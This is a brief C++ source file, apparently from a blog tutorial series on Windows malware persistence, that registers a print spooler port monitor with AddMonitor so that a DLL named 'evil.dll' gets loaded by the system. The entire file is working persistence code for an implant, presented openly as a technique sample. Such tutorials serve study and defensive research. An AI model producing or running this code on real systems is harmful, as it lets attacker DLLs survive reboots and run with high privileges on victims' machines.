/*
monitor.cpp
windows persistence via port monitors
register the monitor port
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2022/06/19/malware-pers-8.html
*/
#include "windows.h"
#pragma comment(lib, "winspool")

int main(int argc, char* argv[]) {
  MONITOR_INFO_2 mi;
  mi.pName = "Monitor";
  mi.pEnvironment = "Windows x64";
  mi.pDLLName = "evil.dll";
  // mi.pDLLName = "evil2.dll";
  AddMonitor(NULL, 2, (LPBYTE)&mi);
  return 0;
}
